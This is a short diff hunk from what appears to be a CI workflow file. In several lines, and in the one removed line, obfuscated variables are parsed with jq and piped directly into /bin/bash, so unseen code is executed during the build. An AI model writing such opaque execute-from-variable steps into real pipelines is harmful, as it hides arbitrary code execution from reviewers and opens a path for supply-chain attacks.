@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$kkhxd1877" | jq -r .i74 | /bin/bash
           echo $zunn06 | jq -r .wop2060 | /bin/bash
           printf '%s' "$iii038" | jq -r .so9 | /bin/bash
-          echo $dh23 | jq -r .od52 | /bin/bash
 
       - name: Save output
         if: always()
